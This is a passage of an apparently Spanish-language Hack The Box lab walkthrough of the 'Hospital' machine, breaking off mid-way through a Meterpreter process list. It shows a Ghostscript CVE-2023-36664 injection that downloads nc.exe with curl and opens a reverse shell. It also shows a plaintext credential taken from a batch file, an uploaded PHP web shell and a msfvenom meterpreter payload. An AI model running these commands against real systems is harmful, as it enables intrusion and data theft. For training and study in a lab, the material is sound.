<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
Cloning into <span class="s1">'CVE-2023-36664-Ghostscript-command-injection'</span>...
remote: Enumerating objects: 34, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>34/34<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>32/32<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 34 <span class="o">(</span>delta 15<span class="o">)</span>, reused 5 <span class="o">(</span>delta 1<span class="o">)</span>, pack-reused 0
Receiving objects: 100% <span class="o">(</span>34/34<span class="o">)</span>, 71.69 KiB | 407.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>15/15<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>CVE-2023-36664-Ghostscript-command-injection
➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">ls
</span>CVE_2023_36664_exploit.py  README.md  file.eps  file.ps  flowchart.png  vsociety.jpg
➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> python3 CVE_2023_36664_exploit.py
<span class="o">[</span>-] Either <span class="nt">--payload</span> or <span class="nt">--revshell</span> is required.
</code></pre></div></div>

<ul>
  <li>Para ganar acceso necesitamos subir el ejecutable de <code class="language-plaintext highlighter-rouge">netcat</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"curl 10.10.14.71:80/nc.exe -o nc.exe"</span> <span class="nt">--filename</span> file.eps
<span class="o">[</span>+] Payload successfully injected into file.eps.
</code></pre></div></div>

<ul>
  <li>Ahora vamos a enviar el <code class="language-plaintext highlighter-rouge">.eps</code> al <code class="language-plaintext highlighter-rouge">Dr.Brown</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/14.png" />
</p>

<ul>
  <li>Una vez enviamos el mensaje nos llega la solicitud que descargo el <code class="language-plaintext highlighter-rouge">nc.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.241 - - <span class="o">[</span>11/May/2024 18:36:30] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Ahora nos vamos a enviar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"nc.exe 10.10.14.71 443 -e cmd.exe"</span> <span class="nt">--filename</span> file.eps
<span class="o">[</span>+] Payload successfully injected into file.eps.
</code></pre></div></div>

<ul>
  <li>
    <p>Y de igual manera enviamos por correo al mismo destinatario el <code class="language-plaintext highlighter-rouge">file.eps</code>.</p>
  </li>
  <li>
    <p>Nos llega la shell.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.241] 6171
Microsoft Windows <span class="o">[</span>Version 10.0.17763.4974]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;whoami
<span class="nb">whoami
</span>hospital<span class="se">\d</span>rbrown

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="usertxt">User.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;type C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
9094302029572892e53320578b26c0b0
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>En el directorio de <code class="language-plaintext highlighter-rouge">Documents</code> podemos ver que allí se encuentra el <code class="language-plaintext highlighter-rouge">.bat</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments

05/12/2024  12:36 AM    &lt;DIR&gt;          <span class="nb">.</span>
05/12/2024  12:36 AM    &lt;DIR&gt;          ..
10/23/2023  03:33 PM               373 ghostscript.bat
05/12/2024  12:36 AM            28,160 nc.exe
               2 File<span class="o">(</span>s<span class="o">)</span>         28,533 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,184,203,264 bytes free

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;type ghostscript.bat
<span class="nb">type </span>ghostscript.bat
@echo off
<span class="nb">set </span><span class="nv">filename</span><span class="o">=</span>%~1
powershell <span class="nt">-command</span> <span class="s2">"</span><span class="nv">$p</span><span class="s2"> = convertto-securestring 'chr!</span><span class="nv">$br0wn</span><span class="s2">' -asplain -force;</span><span class="nv">$c</span><span class="s2"> = new-object system.management.automation.pscredential('hospital</span><span class="se">\d</span><span class="s2">rbrown', </span><span class="nv">$p</span><span class="s2">);Invoke-Command -ComputerName dc -Credential </span><span class="nv">$c</span><span class="s2"> -ScriptBlock { cmd.exe /c "</span>C:<span class="se">\P</span>rogram<span class="sb">`</span> Files<span class="se">\g</span>s<span class="se">\g</span>s10.01.1<span class="se">\b</span><span class="k">in</span><span class="se">\g</span>swin64c.exe<span class="s2">" -dNOSAFER "</span>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ownloads<span class="se">\%</span>filename%<span class="s2">" }"</span>
C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Tenemos la credencial del <code class="language-plaintext highlighter-rouge">Dr.Brown:chr!$br0wn</code> vamos a validarlas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ cme smb 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>+] hospital.htb<span class="se">\d</span>rbrown:chr!<span class="nv">$br0wn</span>
</code></pre></div></div>

<ul>
  <li>Podemos usar evil-winrm para mas comodo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme winrm 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>
SMB         10.10.11.241    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span>
HTTP        10.10.11.241    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.241:5985/wsman
WINRM       10.10.11.241    5985   DC               <span class="o">[</span>+] hospital.htb<span class="se">\d</span>rbrown:chr!<span class="nv">$br0wn</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>

➜  content evil-winrm <span class="nt">-i</span> 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>hospital<span class="se">\d</span>rbrown
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Si probamos el <code class="language-plaintext highlighter-rouge">winpeas</code> <a href="https://github.com/peass-ng/PEASS-ng/releases">https://github.com/peass-ng/PEASS-ng/releases</a> al ejecutar esto encontramos lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications <span class="nt">--Via</span> Program Files/Uninstall registry--
È Check <span class="k">if </span>you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
    C:<span class="se">\P</span>rogram Files<span class="se">\C</span>ommon Files
    C:<span class="se">\P</span>rogram Files<span class="se">\d</span>esktop.ini
    C:<span class="se">\P</span>rogram Files<span class="se">\d</span>otnet
    C:<span class="se">\P</span>rogram Files<span class="se">\G</span>oogle
    C:<span class="se">\P</span>rogram Files<span class="se">\g</span>s
    C:<span class="se">\P</span>rogram Files<span class="se">\H</span>yper-V
    C:<span class="se">\P</span>rogram Files<span class="se">\i</span>nternet explorer
    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft
    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft UCMA 4.0
    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>SBuild
    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>ackageManagement
    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>uTTY
    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>ython312
    C:<span class="se">\P</span>rogram Files<span class="se">\R</span>eference Assemblies
    C:<span class="se">\P</span>rogram Files<span class="se">\U</span>ninstall Information
    C:<span class="se">\P</span>rogram Files<span class="se">\V</span>Mware
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender Advanced Threat Protection
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Identity Foundation
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Mail
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Media Player
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Multimedia Platform
    C:<span class="se">\P</span>rogram Files<span class="se">\w</span>indows nt
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Photo Viewer
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Portable Devices
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Security
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Sidebar
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsApps
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowerShell
    C:<span class="se">\x</span>ampp<span class="o">(</span>Users <span class="o">[</span>AppendData/CreateDirectories WriteData/CreateFiles]<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>El <code class="language-plaintext highlighter-rouge">AppendData</code> significa que podemos añadir datos o archivos o crear directorios dentro de la carpeta especificada y <code class="language-plaintext highlighter-rouge">WriteData/CreateFiles</code> nos permite escribir datos en archivos existentes o crear nuevos archivos dentro del directorio como es común en aplicaciones web o servidores que se gestionan a través de <code class="language-plaintext highlighter-rouge">XAMPP</code>. En este caso, <code class="language-plaintext highlighter-rouge">XAMPP</code>, que es un paquete que incluye <code class="language-plaintext highlighter-rouge">Apache</code>, <code class="language-plaintext highlighter-rouge">MySQL</code>, y otros componentes para servidores web, necesitaría estos permisos para operar correctamente y permitir al usuario administrar sitios web, bases de datos, y otros servicios relacionados.</p>
  </li>
  <li>
    <p>Si entramos en <code class="language-plaintext highlighter-rouge">htdocs</code> encontramos archivos de configuración.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp&gt; <span class="nb">cd </span>htdocs
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----       10/22/2023  10:19 PM                bin
d-----       10/22/2023  11:47 PM                config
d-----       10/22/2023  10:33 PM                default
d-----       10/22/2023  10:19 PM                installer
d-----       10/22/2023  10:32 PM                logs
d-----       10/22/2023  10:19 PM                plugins
d-----       10/22/2023  10:20 PM                program
d-----       10/22/2023  10:20 PM                skins
d-----       10/22/2023  10:19 PM                SQL
d-----        5/12/2024  12:41 AM                temp
d-----       10/22/2023  10:20 PM                vendor
<span class="nt">-a----</span>       10/16/2023  12:23 PM           2553 .htaccess
<span class="nt">-a----</span>       10/16/2023  12:23 PM         211743 CHANGELOG.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            994 composer.json
<span class="nt">-a----</span>       10/16/2023  12:23 PM           1086 composer.json-dist
<span class="nt">-a----</span>       10/16/2023  12:23 PM          56279 composer.lock
<span class="nt">-a----</span>       10/16/2023  12:23 PM          11199 index.php
<span class="nt">-a----</span>       10/16/2023  12:23 PM          12661 INSTALL
<span class="nt">-a----</span>       10/16/2023  12:23 PM          35147 LICENSE
<span class="nt">-a----</span>       10/16/2023  12:23 PM           3853 README.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            967 SECURITY.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM           4657 UPGRADING


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
</code></pre></div></div>

<ul>
  <li>Si vemos los permisos establecidos para la carpeta los permisos indican que las cuentas de servicio del sistema y los administradores tienen acceso completo, mientras que los usuarios normales tienen permisos más limitados de lectura y ejecución, con capacidades específicas para añadir o borrar datos. Esto es típico en entornos donde se necesita limitar el acceso de los usuarios comunes para prevenir cambios no autorizados en aplicaciones críticas como las que se manejan a través de XAMPP.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp&gt; icacls htdocs
htdocs NT AUTHORITY<span class="se">\L</span>OCAL SERVICE:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
       NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
       BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>AD<span class="o">)</span>
       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>WD<span class="o">)</span>
       CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>

Successfully processed 1 files<span class="p">;</span> Failed processing 0 files
</code></pre></div></div>

<ul>
  <li>Podemos añadir y escribir en la carpeta si queremos ganar acceso rápido lo que podemos hacer es subir el <a href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a> .</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.241 - - <span class="o">[</span>11/May/2024 19:12:01] <span class="s2">"GET /shell.php HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; curl <span class="nt">-o</span> shell.php http://10.10.14.71:80/shell.php
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----       10/22/2023  10:19 PM                bin
d-----       10/22/2023  11:47 PM                config
d-----       10/22/2023  10:33 PM                default
d-----       10/22/2023  10:19 PM                installer
d-----       10/22/2023  10:32 PM                logs
d-----       10/22/2023  10:19 PM                plugins
d-----       10/22/2023  10:20 PM                program
d-----       10/22/2023  10:20 PM                skins
d-----       10/22/2023  10:19 PM                SQL
d-----        5/12/2024  12:41 AM                temp
d-----       10/22/2023  10:20 PM                vendor
<span class="nt">-a----</span>       10/16/2023  12:23 PM           2553 .htaccess
<span class="nt">-a----</span>       10/16/2023  12:23 PM         211743 CHANGELOG.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            994 composer.json
<span class="nt">-a----</span>       10/16/2023  12:23 PM           1086 composer.json-dist
<span class="nt">-a----</span>       10/16/2023  12:23 PM          56279 composer.lock
<span class="nt">-a----</span>       10/16/2023  12:23 PM          11199 index.php
<span class="nt">-a----</span>       10/16/2023  12:23 PM          12661 INSTALL
<span class="nt">-a----</span>       10/16/2023  12:23 PM          35147 LICENSE
<span class="nt">-a----</span>       10/16/2023  12:23 PM           3853 README.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            967 SECURITY.md
<span class="nt">-a----</span>        5/12/2024   1:12 AM          20321 shell.php
<span class="nt">-a----</span>       10/16/2023  12:23 PM           4657 UPGRADING


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/15.png" />
</p>

<h2 id="la-otra-forma-de-escalar-privilegios">La otra forma de escalar privilegios</h2>

<ul>
  <li>En esta maquina existe otra forma de escalar privilegios si vemos las sesiones activas en el sistema vemos que hay una sesión activa por el doctor cada usuario corre tareas o servicios del sistema para enumerarlos vamos a usar <code class="language-plaintext highlighter-rouge">Metasploit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
<span class="o">&gt;</span>services                                    0  Disc
 console           drbrown                   1  Active
 rdp-tcp                                 65536  Listen
</code></pre></div></div>

<ul>
  <li>Lo primero que vamos a hacer ejecutarnos un <code class="language-plaintext highlighter-rouge">.exe</code> para ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.71 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="o">&gt;</span> shell.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
</code></pre></div></div>

<ul>
  <li>Ahora lo subimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt; upload shell.exe

Info: Uploading /home/miguel/Hackthebox/Hospital/content/shell.exe to C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\s</span>hell.exe

Data: 9556 bytes of 9556 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<ul>
  <li>Iniciamos <code class="language-plaintext highlighter-rouge">Metasploit</code> y preparamos todo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfconsole
Metasploit tip: Use <span class="nb">help</span> &lt;<span class="nb">command</span><span class="o">&gt;</span> to learn more about any <span class="nb">command</span>

  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  <span class="o">==</span>c<span class="o">(</span>______<span class="o">(</span>o<span class="o">(</span>______<span class="o">(</span>_<span class="o">()</span>  | |<span class="s2">""""""""""""</span>|<span class="o">======[</span><span class="k">***</span>  |
  |             <span class="o">)=</span><span class="se">\ </span>          | |  EXPLOIT   <span class="se">\ </span>           |
  |            // <span class="se">\\</span>          | |_____________<span class="se">\_</span>______    |
  |           //   <span class="se">\\</span>         | |<span class="o">==[</span>msf <span class="o">&gt;]============</span><span class="se">\ </span>  |
  |          //     <span class="se">\\</span>        | |______________________<span class="se">\ </span> |
  |         // RECON <span class="se">\\</span>       | <span class="se">\(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)</span>/   |
  |        //         <span class="se">\\</span>      |  <span class="k">*********************</span>    |
  +---------------------------+---------------------------+
  |      o O o                |        <span class="se">\'\/\/\/</span><span class="s1">'/         |
  |              o O          |         )======(          |
  |                 o         |       .'</span>  LOOT  <span class="s1">'.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '</span><span class="nt">--------------</span><span class="s1">'      |
  +---------------------------+---------------------------+


       =[ metasploit v6.4.2-dev                           ]
+ -- --=[ 2408 exploits - 1240 auxiliary - 422 post       ]
+ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 10.10.14.71
lhost =&gt; 10.10.14.71
msf6 exploit(multi/handler) &gt; set lport 443
lport =&gt; 443
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.14.71:443
</span></code></pre></div></div>

<ul>
  <li>Ahora ejecutamos el <code class="language-plaintext highlighter-rouge">.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt; .<span class="se">\s</span>hell.exe
</code></pre></div></div>

<ul>
  <li>Ahora ya obtenemos una conexión, vamos a ver los procesos que se están corriendo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> ps

Process List
<span class="o">============</span>

 PID   PPID  Name       Arch  Session  User            Path
 <span class="nt">---</span>   <span class="nt">----</span>  <span class="nt">----</span>       <span class="nt">----</span>  <span class="nt">-------</span>  <span class="nt">----</span>            <span class="nt">----</span>
 0     0     <span class="o">[</span>System P
             rocess]
 4     0     System
 48    4     Secure Sy
             stem
 92    4     Registry
 336   4     smss.exe
 364   656   svchost.e
             xe
 368   656   svchost.e
             xe
 380   656   svchost.e
             xe
 416   408   csrss.exe
 516   616   dwm.exe
 520   408   wininit.e
             xe
 528   512   csrss.exe
 616   512   winlogon.
             exe
 656   520   services.
             exe
 676   520   LsaIso.ex
             e
 684   520   lsass.exe
 784   656   svchost.e
             xe
 852   656   VGAuthSer
             vice.exe
 892   656   svchost.e
             xe
 900   656   svchost.e
             xe
 912   656   svchost.e
             xe
 952   656   svchost.e
             xe
 996   656   svchost.e
             xe
 1016  656   svchost.e
             xe
 1052  656   svchost.e
             xe
 1072  656   svchost.e
             xe
 1116  656   svchost.e
             xe
 1164  656   svchost.e
             xe
 1244  656   svchost.e
             xe
 1276  656   svchost.e
             xe
 1304  656   svchost.e
             xe
 1324  656   svchost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             xe                        wn              em32<span class="se">\s</span>vchost.ex
                                                       e
 1336  656   svchost.e
             xe
 1408  656   svchost.e
             xe
 1416  656   svchost.e
             xe
 1452  656   svchost.e
             xe
 1520  656   svchost.e
             xe
 1540  656   svchost.e
             xe
 1548  656   svchost.e
             xe
 1616  656   svchost.e
             xe
 1624  656   svchost.e
             xe
 1752  656   svchost.e
             xe
 1760  656   svchost.e
             xe
 1780  656   svchost.e
             xe
 1792  656   svchost.e
             xe
 1856  656   svchost.e
             xe
 1900  656   svchost.e
             xe
 1924  656   svchost.e
